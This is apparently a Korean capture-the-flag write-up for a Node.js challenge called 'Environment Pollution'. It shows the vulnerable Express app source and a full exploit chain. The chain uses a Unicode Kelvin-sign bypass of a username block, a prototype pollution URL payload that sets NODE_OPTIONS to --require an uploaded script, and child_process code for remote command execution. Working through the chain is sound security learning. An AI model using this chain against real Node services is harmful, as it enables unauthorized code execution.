## Environment Pollution
---

+ app.js

```javascript
'use strict';
const express       =   require('express');
const cookieParser  =   require('cookie-parser');
const fs            =   require('fs');
const multer        =   require('multer');
const upload        =   require('./custom');
const mysql         =   require('mysql');
const jwt           =   require('jsonwebtoken');
const {spawnSync}   =   require('child_process');
const func          =   require('./userfunc');

const app           =   express();
const conn          =   func.connection();
const SECRET        =   process.env.SECRET;
const PORT          =   process.env.PORT;
const basedir       =   "./publics/uploads/"

console.log(`[*] The secret value is ${SECRET}`);

app.use(cookieParser());
app.use(express.urlencoded({extended: true}));

app.set('views', __dirname + '/template');
app.set('view engine', 'ejs');

app.get('/', (req, res) => {
    res.render('index.ejs');
});

app.get('/login', (req, res) => {
    res.render('login.ejs');
});

app.post('/login', (req, res) => {
    const id = req.body.id;
    const pw = req.body.pw;

    if (id == '' || pw ==''){
        res.send("<script>alert('Empty values must not exist');history.go(-1);</script>");
    }
    else{
        func.getuser(mysql.format("SELECT * FROM users where id = ?", id), function(err, data){
            if(err){
                req.send(err);
            }
            else{
                if(data){
                    console.log(func.sha256(pw))
                    if(func.sha256(pw) !== data.pw){ res.send("<script>alert('ID or password does not match.');history.go(-1);</script>");}
                    else{
                        const token = jwt.sign({ user: data.id}, SECRET, { expiresIn: '1h'});
                        res.cookie('user', token);
                        res.redirect("/");
                    }
                }
                else { res.send("<script>alert('User information does not exist.');history.go(-1);</script>")}
            }
        });
    }
});

app.get('/register', (req, res) => {
    res.render('register.ejs');
});

app.post('/register', (req, res) => {
    const name = req.body.name;
    const id = req.body.id;
    const pw = req.body.pw;
    const rpw = req.body.rpw;

    if (/[A-Z]/g.test(id) || id == 'korea_pocas') {
        res.send("This user is not allowed.").status(400);
    }
    else{
        if(name == '' || id == '' || pw == ''){
            res.send("<script>alert('Empty values must not exist');history.go(-1);</script>");
        }
        else{
            func.getuser(mysql.format("select * from users where id = ?", id), function(err, data){
                if(err){
                    res.send(err);
                }
                else{
                  if(data){
                      res.send("<script>alert('This ID is already taken.');history.go(-1);</script>");
                  }
                 else{
                    if(pw !== rpw){
                        res.send("<script>alert('Please enter the same password');history.go(-1);</script>");
                    }
                    else{
                        const params = [name.toLowerCase(), id.toLowerCase(), func.sha256(pw.toLowerCase())];
                        conn.query(mysql.format("insert into users(name, id, pw) values(?, ?, ?);", params), function(err, rows){
                            if(err) { res.send(err);}
                            else {res.redirect("/login");}
                        });
                    }
                  }
                }
            });
        }
    }
});

app.get('/raw/:filename', function(req, res){
    const file = {};
    const filename = req.params.filename;
    const filepath = `publics/uploads/${filename}`;

    try{
        func.getfile(mysql.format("select * from filelist where path = ?", filepath), function(err, data){
            if(err) {
                res.send(err);
            }
            else{
                if (data){
                    res.download(data.path);
                }else{
                    try{
                        func.merge(file, JSON.parse(`{"filename":"${filename}", "State":"Not Found"}`));
                        res.send(file);
                    } catch (e) {
                        res.send("I don't know..");
                    }
                }
            }
        });
    } catch (e) {
        res.send("I don't know..");
    }
});

app.get('/upload', function(req, res){
    res.render('upload.ejs');
});

app.post('/upload', upload.single('filezz'),function(req, res){
    try{
        conn.query(mysql.format("insert into filelist(path) values (?)", req.file.path), function(err, rows){
            if(err) {res.send(err);}
            else {res.send('Upload Success : ' + req.file.path);}
        });
    } catch (e) {
        res.send("I don't know..");
    }
})

app.get('/debug', function(req, res){
    const cook = req.cookies['user'];
    if (cook !== undefined){
        try{
            const information = jwt.verify(cook, SECRET);
            if (information['user'] == 'korea_pocas'){
                res.send(spawnSync(process.execPath, ['debug.js']).stdout.toString());
            } else {
                res.send("Debug mode off");
            }
        } catch (e) {
            res.status(401).json({ error: 'unauthorized' });
        }
    } else {
        try{
            res.send("You are not login..")
        } catch (e) {
            res.send("I don't know..")
        }
    }
})

app.get('/logout', (req, res) => {
    res.clearCookie("user");
    res.redirect("/");
});

app.listen(PORT, () => {
    console.log(`Listeing PORT ${PORT}....`);
});
```

<br>

+ custom.js

```javascript
const multer = require('multer');

const storage = multer.diskStorage({
    destination : function(req, file, cb){    
  
      cb(null, 'publics/uploads/');
    },
  
    filename : function(req, file, cb){
      var mimeType;
      var filename = file.originalname.split('.')[0];
  
      switch (file.mimetype) {
        case "image/png":
          mimeType = "png";
        break;
        case "chose/javascript":
            mimeType = "js";
        break
        default:
          mimeType = "jpg";
        break;
      } 
      cb(null, filename + "." + mimeType);
    }
  });
  
module.exports = multer({
    storage: storage
});
```

<br>

+ userfunc.js

```javascript
const mysql = require("mysql");
const crypto = require("crypto");

const dbconfig = require("./config/db.js");
const multer = require("multer");
const conn = dbconfig.init();

exports.connection = function() {
    return dbconfig.init();
}

exports.getfile = function (sql, callback){
    conn.query(sql, function (err, rows){
        if(err)
          callback(err, null);
        else
          callback(null, rows[0]);
    });
}

exports.getuser = function (sql, callback){
  conn.query(sql, function (err, rows){
      if(err)
        callback(err, null);
      else
        callback(null, rows[0]);
  });
}

exports.sha256 = function (data) {
    return crypto.createHash("sha256").update(data, "binary").digest("hex");
}

const isObject = function(obj) {
  return obj !== null && typeof obj === 'object';
}

const check = function(key){
  filter = ['outputFunctionName', 'path', 'file']
  for (let i = 0; i < filter.length; i++){
    if (filter[i] == key)
      return false
  }
  return true
}

exports.merge = function(a, b) {
  for (let key in b) {
    if(check(key)){
        if (isObject(a[key]) && isObject(b[key])) {
          this.merge(a[key], b[key]);
        } else {
          a[key] = b[key];
        }
    }
  }
  return a;
}
```

<br><br>

## Solution
---

후... 개같은 문제.. 너무 오래 걸렸다..

코드를 보면 일단 몇 가지 기능들이 있다.

로그인과 레지스터 기능이 있는데, 레지스터 할 때 아이디가 ```korea_pocas```이면 안된다.

그 다음 업로드 기능이 있는데 이 부분은 파일을 업로드하면 ```custom.js``` 파일에서 확장자를 확인해서 조건에 맞게 설정해준다.

마지막 기능이자 핵심 기능은 디버그다.

<br>

문제를 풀기 전 제목에서도 예상하듯, 이 문제는 prototype pollution 문제이다.

어디를 오염시켜야 하는가와 취약점이 발생한 부분은 어디인지 찾아야 한다.

먼저 취약점이 발생하는 부분은 두 객체를 병합하는 ```userfunc.js``` 코드에서 발생한다.

<br>

```javascript
exports.merge = function(a, b) {
  for (let key in b) {
    if(check(key)){
        if (isObject(a[key]) && isObject(b[key])) {
          this.merge(a[key], b[key]);
        } else {
          a[key] = b[key];
        }
    }
  }
  return a;
}
```

<br>

a와 b 객체를 병합하는데, a의 키의 값을 b의 키의 값으로 덮어 쓴다.

여기서 a는 file 변수로 아무 값도 들어있지 않은 객체로 선언되어 있고, b에는 JSON 값을 parse한 값이 들어간다.

이 부분에서 취약점이 발생하여 prototype pollution이 발생한다.

사실 이 부분까지는 좀 걸리긴 했어도 이후 공격 진행 방향은 여러 블로그에도 잘 정리되어 있어서 괜찮았는데...

debug 모드에 들어가려면 korea_pocas로 로그인을 해야 하는데, 이 부분에서 너무 애를 먹었다..

<br><br>

### toLowerCase() logical
---

자바스크립트의 문자열 메소드인 toLowerCase()는 문자열의 대문자를 소문자로 변경시켜주는 메소드이다.

하지만 몇 몇 unicode 값을 변환시키고자 하면 아스키 값으로 변하는 경우도 있다고 한다.

<br>

```
[223] ß (%C3%9F).toUpperCase() => SS (%53%53)
[304] İ (%C4%B0).toLowerCase() => i̇ (%69%307)
[305] ı (%C4%B1).toUpperCase() => I (%49)
[329] ŉ (%C5%89).toUpperCase() => ʼN (%2bc%4e)
[383] ſ (%C5%BF).toUpperCase() => S (%53)
[496] ǰ (%C7%B0).toUpperCase() => J̌ (%4a%30c)
[7830] ẖ (%E1%BA%96).toUpperCase() => H̱ (%48%331)
[7831] ẗ (%E1%BA%97).toUpperCase() => T̈ (%54%308)
[7832] ẘ (%E1%BA%98).toUpperCase() => W̊ (%57%30a)
[7833] ẙ (%E1%BA%99).toUpperCase() => Y̊ (%59%30a)
[7834] ẚ (%E1%BA%9A).toUpperCase() => Aʾ (%41%2be)
[8490] K (%E2%84%AA).toLowerCase() => k (%6b)
[64256] ﬀ (%EF%AC%80).toUpperCase() => FF (%46%46)
[64257] ﬁ (%EF%AC%81).toUpperCase() => FI (%46%49)
[64258] ﬂ (%EF%AC%82).toUpperCase() => FL (%46%4c)
[64259] ﬃ (%EF%AC%83).toUpperCase() => FFI (%46%46%49)
[64260] ﬄ (%EF%AC%84).toUpperCase() => FFL (%46%46%4c)
[64261] ﬅ (%EF%AC%85).toUpperCase() => ST (%53%54)
[64262] ﬆ (%EF%AC%86).toUpperCase() => ST (%53%54)

출처 : https://blog.p6.is/hacktm-ctf-quals-2020/
```

<br>

그 중에서 유니코드 K가 toLowerCase로 변환하면 소문자 아스키 k로 변환된다.

이를 통해 korea_pocas로 로그인하여 debug 모드에 진입할 수 있다!!

<br><br>

### Environment Pollution
---

제목이 이제야 더 확실히 이해가 된다.

아래의 블로그들과 리서치를 확인해보면 알 수 있다.

<br>

<a href="https://blog.p6.is/prototype-pollution-to-rce/" target="_blank">blog.p6.is/prototype-pollution-to-rce/</a>

<a href="https://hackerone.com/reports/878181" target="_blank">hackerone.com/reports/878181</a>

<a href="https://slides.com/securitymb/prototype-pollution-in-kibana" target="_blank">slides.com/securitymb/prototype-pollution-in-kibana</a>

<a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" target="_blank">research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a>

<br>

디버그 코드를 보면 ```spawnSync```가 있는데, 이것은 child-process 모듈에서 가져온 것이다.

child-process를 실행하는 과정에서 내부적으로 환경변수 값을 복사를 해오는데, 이 과정에서 RCE 취약점이 발생한다.

<br>

환경 변수 중에 ```NODE_OPTIONS``` 라는 값이 있는데, 이 값에는 ```--require [module]```라는 옵션이 있다.

이 옵션을 이용하면 스크립트 실행에 ```--require [module]``` 추가하여 실행한 것과 같은 효과를 준다.

<br>

```
process.env 객체 내부에 직접적으로 정의되지 않았더라도

process.env 의 프로토 타입인 Object.prototype 객체가 오염된다면

자식 프로세스 생성에 쓰이는 환경 변수를 임의로 추가해낼 수 있습니다.

출처 : https://blog.p6.is/prototype-pollution-to-rce/
```

<br>

따라서 공격 방식은 다음과 같다.

<br>

```NODE_OPTIONS```의 ```--require [module]```에서 모듈 인자가 될 자바스크립트 코드(environ.js)를 업로드 한다.

이 코드에는 테스트를 위해 ```console.log(123)```을 넣어주도록 한다.

burp를 이용해서 타입을 조건에 맞게 변경(```chose/javascript```)하여 업로드 해주면 된다.

<br>

그 다음 코드를 보면 ```func.merge(file, JSON.parse(`{"filename":"${filename}", "State":"Not Found"}`));```가 있다.

이 부분에서 pollution을 해주면 되므로 ```/raw/abc","__proto__":{"env":{"NODE_OPTIONS":"--require=.%2fpublics%2fuploads%2fenviron.js"}},"b":"sf```로 가주면 pollution이 된다.

<br>

이제 debug 페이지에 가보면 ```123 Debug mode on```이라고 출력된 모습을 볼 수 있다.

이제 environ.js에 rce 코드를 넣어주면 된다.

<br>

```javasript
onst exec = require('child_process').exec, ls = exec('ls'); 

ls.stdout.on('data', function(data) { console.log(data) });
```

<br>

또는 

<br>

```javascript
var spawn = require('child_process').spawn, ls = spawn('ls', ['-a']); 

ls.stdout.on('data', function (data) { console.log('stdout:' + data); });
```

<br>

코드에서 ```stdout.on```을 해줘야 하는데 이유는 아래 블로그에서 확인할 수 있다.

바로 위의 코드도 해당 블로그에서 가져온 것이다.

```
자식 프로세스는 child.stdin, child.stdout, child.stderr 의 3가지 종류의 스트림을 사용합니다.

ChildProcess도 EventEmitter의 객체여서 각 스트림에 이벤트 리스너를 등록할 수 있습니다

출처: https://backback.tistory.com/362 [Back Ground:티스토리]
```

<br>

이벤트는 <a href="https://opentutorials.org/module/938/7629" target="_blank">opentutorials.org/module/938/7629</a>
